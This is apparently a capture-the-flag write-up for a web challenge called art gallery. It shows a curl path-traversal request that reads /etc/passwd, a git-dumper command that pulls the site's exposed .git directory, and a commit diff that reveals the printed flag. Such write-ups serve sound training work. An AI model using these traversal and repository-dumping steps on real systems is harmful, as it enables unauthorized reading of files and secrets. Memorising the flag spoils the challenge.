#### Challenge:

bosh left his [image gallery](https://art-gallery.web.actf.co) service running.... quick, git all of his secrets before he deletes them!!!
[source](./index.js ":ignore")

---

#### Solution:

Trying out the site I noticed that the `member` parameter used for loading the image contains `Local File Inclusion (LFI)` by trying `../../../etc/passwd`:

```bash
curl "https://art-gallery.web.actf.co/gallery?member=../../../etc/passwd"
```

Noticing `git all of his secrets` in the challenge description, we used [git-dumper](https://github.com/arthaud/git-dumper) to dump the art-gallery app repository:

```bash
python3 git_dumper.py  https://art-gallery.web.actf.co/gallery\?member\=../.git/ ~/art-gallery
```

Looking at the commits, we see one with the name `remove vital secrets`. Diffing it to its predecessor reveals the flag:

```bash
git diff 56449caeb7973b88f20d67b4c343cbb895aa6bc7 713a4aba8af38c9507ced6ea41f602b105ca4101 | grep actf
```

---

<details><summary>FLAG:</summary>

```
actf{lfi_me_alone_and_git_out_341n4kaf5u59v}
```

</details>
<br/>
